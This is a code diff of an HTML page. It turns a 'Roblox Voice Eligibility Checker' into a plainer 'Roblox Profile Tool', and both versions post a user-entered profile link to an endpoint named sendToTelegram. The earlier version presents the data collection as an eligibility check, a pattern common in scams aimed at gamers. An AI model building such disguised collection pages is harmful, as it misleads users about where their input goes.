@@ -2,304 +2,50 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Roblox Voice Eligibility Checker</title>
-
-<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700;800&display=swap" rel="stylesheet">
-
-<style>
-*{
-margin:0;
-padding:0;
-box-sizing:border-box;
-font-family:'Outfit',sans-serif;
-}
-
-body{
-background:#040404;
-color:white;
-min-height:100vh;
-overflow-x:hidden;
-position:relative;
-}
-
-body::before{
-content:"";
-position:fixed;
-left:-300px;
-top:100px;
-width:700px;
-height:700px;
-background:radial-gradient(circle,#ff003c44,transparent 70%);
-pointer-events:none;
-}
-
-body::after{
-content:"";
-position:fixed;
-right:-300px;
-top:0;
-width:700px;
-height:700px;
-background:radial-gradient(circle,#ff003c33,transparent 70%);
-pointer-events:none;
-}
-
-.container{
-max-width:850px;
-margin:auto;
-padding:40px 20px;
-}
-
-.back-btn{
-display:inline-flex;
-align-items:center;
-gap:8px;
-padding:14px 28px;
-border-radius:999px;
-background:#111;
-border:1px solid #222;
-color:#aaa;
-text-decoration:none;
-margin-bottom:35px;
-transition:.3s;
-}
-
-.back-btn:hover{
-color:white;
-border-color:#ff003c;
-}
-
-.card{
-background:rgba(16,16,16,.85);
-border:1px solid rgba(255,255,255,.05);
-border-radius:34px;
-padding:55px;
-backdrop-filter:blur(15px);
-box-shadow:
-0 0 50px rgba(0,0,0,.5),
-0 0 40px rgba(255,0,60,.08);
-}
-
-.title{
-font-size:72px;
-font-weight:800;
-line-height:1;
-margin-bottom:18px;
-
-background:linear-gradient(
-90deg,
-#ff7ea0,
-#ff2957,
-#ff003c
-);
-
--webkit-background-clip:text;
--webkit-text-fill-color:transparent;
-}
-
-.subtitle{
-color:#8c8c8c;
-font-size:20px;
-margin-bottom:35px;
-}
-
-.input{
-width:100%;
-height:72px;
-border-radius:22px;
-border:1px solid rgba(255,255,255,.08);
-background:#171717;
-padding:0 25px;
-color:white;
-font-size:18px;
-outline:none;
-}
-
-.input:focus{
-border-color:#ff003c;
-box-shadow:0 0 25px rgba(255,0,60,.3);
-}
-
-.unlock-btn{
-margin-top:25px;
-width:100%;
-height:72px;
-border:none;
-cursor:pointer;
-border-radius:999px;
-font-size:24px;
-font-weight:700;
-color:white;
-
-background:linear-gradient(
-90deg,
-#ff0044,
-#ff002b
-);
-
-box-shadow:
-0 0 30px rgba(255,0,60,.5);
-
-transition:.3s;
-}
-
-.unlock-btn:hover{
-transform:translateY(-2px);
-box-shadow:
-0 0 45px rgba(255,0,60,.7);
-}
-
-.howto{
-margin-top:40px;
-background:rgba(16,16,16,.85);
-border-radius:34px;
-padding:50px;
-border:1px solid rgba(255,255,255,.05);
-}
-
-.howto h2{
-text-align:center;
-font-size:54px;
-
-background:linear-gradient(
-90deg,
-#ffd0dc,
-#ff0044
-);
-
--webkit-background-clip:text;
--webkit-text-fill-color:transparent;
-
-margin-bottom:10px;
-}
-
-.howto p{
-text-align:center;
-color:#888;
-margin-bottom:30px;
-}
-
-.video-btn{
-width:110px;
-height:110px;
-border-radius:50%;
-border:none;
-cursor:pointer;
-display:block;
-margin:auto;
-
-background:linear-gradient(
-180deg,
-#ff335f,
-#ff002f
-);
-
-box-shadow:
-0 0 40px rgba(255,0,60,.5);
-
-font-size:42px;
-color:white;
-}
-
-.footer{
-text-align:center;
-margin-top:25px;
-color:#666;
-}
-
-@media(max-width:700px){
-
-.title{
-font-size:42px;
-}
-
-.card{
-padding:30px;
-}
-
-.howto{
-padding:30px;
-}
-
-.howto h2{
-font-size:38px;
-}
-
-}
-</style>
+<title>Roblox Tool</title>
 </head>
 
-<body>
+<body style="background:#0f172a; color:white; font-family:Arial; text-align:center; padding-top:100px;">
 
-<div class="container">
+<h1>Roblox Profile Tool</h1>
 
-<a href="#" class="back-btn">
-← Back
-</a>
+<input id="profileLink" placeholder="Enter Roblox link"
+style="padding:10px; width:300px; margin-top:20px;">
 
-<div class="card">
+<br><br>
 
-<h1 class="title">
-Roblox Voice Eligibility Checker
-</h1>
-
-<p class="subtitle">
-Check your Roblox profile eligibility
-</p>
-
-<input
-class="input"
-type="text"
-placeholder="Enter your Roblox profile link"
-id="profileLink"
-/>
-
-<button class="unlock-btn" onclick="send()">
-Check Profile
+<button onclick="send()" style="
+padding:12px 25px;
+background:red;
+color:white;
+border:none;
+cursor:pointer;
+border-radius:8px;">
+Send
 </button>
 
-</div>
-
-<div class="howto">
-
-<h2>How to use</h2>
-
-<p>Video tutorial</p>
-
-<button class="video-btn">
-▶
-</button>
-
-</div>
-
-<div class="footer">
-© 2025 Roblox Tool
-</div>
-
-</div>
-
-</body>
-  <script>
+<script>
 async function send() {
-    const link = document.getElementById("profileLink").value;
+  const link = document.getElementById("profileLink").value;
 
-    if(!link){
-        alert("Enter link");
-        return;
-    }
+  if (!link) {
+    alert("Enter link!");
+    return;
+  }
 
-    await fetch("/api/sendToTelegram", {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-            profileLink: link
-        })
-    });
+  await fetch("/api/sendToTelegram", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      profileLink: link
+    })
+  });
 
-    alert("Sent!");
+  alert("Sent to Telegram!");
 }
 </script>
+
+</body>
 </html>
